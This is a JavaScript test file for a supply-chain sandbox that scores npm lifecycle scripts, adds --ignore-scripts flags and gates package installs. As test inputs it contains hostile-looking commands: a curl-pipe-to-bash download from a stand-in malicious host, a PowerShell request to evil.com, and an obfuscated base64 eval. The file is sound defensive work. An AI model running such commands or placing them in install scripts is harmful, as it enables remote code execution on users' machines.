import assert from "node:assert/strict";
import test from "node:test";
import {
  analyzeLifecycleScript,
  evaluateSandboxGate,
  injectSandboxFlags,
} from "../src/sandbox/index.js";

test("Supply-Chain Script Sandbox - Lifecycle Script Analysis", async (t) => {
  await t.test("detects curl/wget network downloads as critical risk", () => {
    const res = analyzeLifecycleScript(
      "postinstall",
      "curl -fsSL https://malicious.evil/payload.sh | bash",
    );
    assert.equal(res.risk, "critical");
    assert.ok(res.reasons.some((r) => r.includes("network download")));
  });

  await t.test("detects arbitrary shell execution and eval", () => {
    const res = analyzeLifecycleScript(
      "preinstall",
      "powershell -Command Invoke-RestMethod http://evil.com",
    );
    assert.equal(res.risk, "critical");
    assert.ok(res.reasons.some((r) => r.includes("network download")));
  });

  await t.test("detects obfuscated base64 payloads", () => {
    const res = analyzeLifecycleScript(
      "postinstall",
      'node -e \'eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString())\'',
    );
    assert.equal(res.risk, "critical");
    assert.ok(res.reasons.some((r) => r.includes("Obfuscated payload")));
  });

  await t.test("classifies safe benign script as low risk", () => {
    const res = analyzeLifecycleScript("postinstall", "echo 'Installation complete'");
    assert.equal(res.risk, "low");
  });
});

test("Supply-Chain Script Sandbox - Flag Injection", async (t) => {
  await t.test("injects --ignore-scripts into npm/pnpm/bun commands", () => {
    const args = ["add", "zod"];
    const modified = injectSandboxFlags("npm", "pnpm", args, "zod", {
      enabled: true,
    });
    assert.ok(modified.includes("--ignore-scripts"));
    assert.deepEqual(modified, ["add", "zod", "--ignore-scripts"]);
  });

  await t.test("respects allowScripts whitelist and bypasses --ignore-scripts", () => {
    const args = ["add", "esbuild"];
    const modified = injectSandboxFlags("npm", "pnpm", args, "esbuild", {
      enabled: true,
      allowScripts: ["esbuild"],
    });
    assert.equal(modified.includes("--ignore-scripts"), false);
    assert.deepEqual(modified, ["add", "esbuild"]);
  });

  await t.test("injects --no-build-isolation for pip under sandbox", () => {
    const args = ["install", "fastapi"];
    const modified = injectSandboxFlags("pypi", "pip", args, "fastapi", {
      enabled: true,
    });
    assert.ok(modified.includes("--no-build-isolation"));
  });

  await t.test("does not modify arguments when sandbox is disabled", () => {
    const args = ["add", "tokio"];
    const modified = injectSandboxFlags("cargo", "cargo", args, "tokio", {
      enabled: false,
    });
    assert.deepEqual(modified, ["add", "tokio"]);
  });
});

test("Supply-Chain Script Sandbox - Policy Gate", async (t) => {
  await t.test("allows packages without sandbox enabled", async () => {
    const gate = await evaluateSandboxGate(
      { raw: "npm:zod", name: "zod", ecosystem: "npm" },
      { enabled: false },
    );
    assert.equal(gate.blocked, false);
    assert.equal(gate.safe, true);
  });

  await t.test("non-npm ecosystems pass gate safely", async () => {
    const gate = await evaluateSandboxGate(
      { raw: "cargo:tokio", name: "tokio", ecosystem: "cargo" },
      { enabled: true },
    );
    assert.equal(gate.blocked, false);
    assert.equal(gate.safe, true);
  });
});
